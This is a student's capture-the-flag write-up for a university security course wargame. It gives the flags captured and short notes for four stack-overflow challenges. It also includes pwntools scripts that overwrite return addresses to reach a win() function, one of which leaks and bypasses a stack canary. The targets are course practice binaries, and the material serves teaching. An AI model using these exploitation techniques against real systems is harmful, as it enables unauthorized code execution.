# COMP6447 Wargame 2
Written by WENG XINN CHOW (z5346077) on 13.06.2022

jump
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1qdW1wIiwiaXAiOiIxMDMuMjE2LjE5MC4zNyIsInNlc3Npb24iOiIwMzZhOTgxMi00YWM0LTQyMjktYTRjNy00MTQzMDU3YjZlNTAifQ.agH2ctSVrkSfXwONPEp2dswt5n6jnSSQH_fAv_m9Ek4}

General overview of problems faced
-------------------------------------
1. Had to find win() address using ```objdump -d jump```.
2. Had to find the correct buffer to overwrite.

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port =  28958
p = remote(host, port)

p.recvuntil('at ')
win_add = p.recvuntil('\n')[:-1]
# Overwrite the buffer with the win() address: 0x8048536
win_addr = 0x8048536
res = str('a' * 64).encode('UTF-8') + p32(win_addr)
print(res)
p.sendline(res)

p.interactive()
```
blind
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1ibGluZCIsImlwIjoiMTAzLjIxNi4xOTAuMzciLCJzZXNzaW9uIjoiZDA1YTcwNmQtMGE1Ni00MjFkLWJhMzUtOWJkZDkyODYyM2RhIn0.tM9SPq8VqXYwhuDrmu0Oaa-2qxWC-YqF6Zl4yMrB90g}

General overview of problems faced
-------------------------------------
1. Had to find win() address using ```objdump -d blind```.
2. Had to figure out the correct buffer to overwrite.

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port =  28872
p = remote(host, port)

# Overwrite the buffer with the win() address: 0x80484d6
win_addr = 0x80484d6
res = str('a' * 72).encode('UTF-8') + p32(win_addr)
print(res)
p.sendline(res)

p.interactive()
```
bestsecurity
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1iZXN0c2VjdXJpdHkiLCJpcCI6IjEwMy4yMTYuMTkwLjM3Iiwic2Vzc2lvbiI6ImU5M2ZjODI5LTViOWEtNGUxZS1iZDhjLWIxMjM0MGE1NTdjYyJ9.vs6FWCP_w5yHjluF_i5R1EkSTpxJc_YKd2Qj6KmAQe8}

General overview of problems faced
-------------------------------------
1. Had to find the correct canary value. By using ```binary ninja```, I was able to  guess that the value is '1234'.
2. Had to figure out how many times '1234' should be entered as input. Using```gdb```, we know that the buffer size is 128, thus in order to overwrite the buffer, at least 33 times '1234 should be entered. 

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port =  26949
p = remote(host, port)

# Bypass the canary by entering enough times of 1234
res = '1234' * 33
p.sendline(str(res).encode('UTF-8'))

p.interactive()
```
stack-dump
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiMi1zdGFjay1kdW1wIiwiaXAiOiIxMDMuMjE2LjE5MC4zNyIsInNlc3Npb24iOiJkZDljMjA5OS1kZWYyLTRkZGMtYWUxYS05ZjA3ZjVlOTBiMzQifQ.cVeJg74qJ0bL7dMVjTJmLXbLbHwqiDxggpLb5ch2HS0}

General overview of problems faced
-------------------------------------
1. Had to find out the canary address. Using ```canary``` in gdb, I was was able to find out the  canary address. Thus, subtracting it by the useful pointer gives 105. 
2. Had to figure  out the  canary value. This can be done by printing the dump memory. 
3. Had to discover the  win() address and the correct buffer to reach the canary.
4. Had to bypass the canary and then overwrite the  return address with enough times of win() address.  

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port =  24973
p = remote(host, port)

# Get the useful pointer (stack pointer)
# The canary is located at +105 of the  pointer 
p.recvuntil(b'pointer ')
pointer = p.recvuntil(b'\n')[:-1]
canary_addr = int(pointer, 0) + 105
canary_addr = p32(canary_addr)
canary_addr += b'\n'

p.recvlines(4)

p.sendline(b'a')
p.sendline(b'5')
p.sendline(canary_addr)
p.recvlines(10)

# Print the dump memory and the canary value = first 4 bytes
p.sendline(b'b')
canary = p.recvline()
canary = canary[22:26]

p.recvlines(4)

p.sendline(b'a')
win_addr = 0x080486c6
# Overwrite the buffer (96) and the correct canary value
# then overwrite the return address with enough time of the win() address 
res = b'A' * 96 + canary + p32(win_addr) * 3
p.sendline(res)

p.interactive()
```
re chall1
=============
General overview of problems faced
-------------------------------------
1. Had to recall back c knowledge (e.g. scanf, printf).
2. Had to refresh my memory on assembly.
```C
int main(int argc, char** argv) {
    int a;
    scanf('%d', &a);

    if (a == 1337){
        printf("Your so leet!");
    }
    else{
        printf("Bye");
    }
}
```
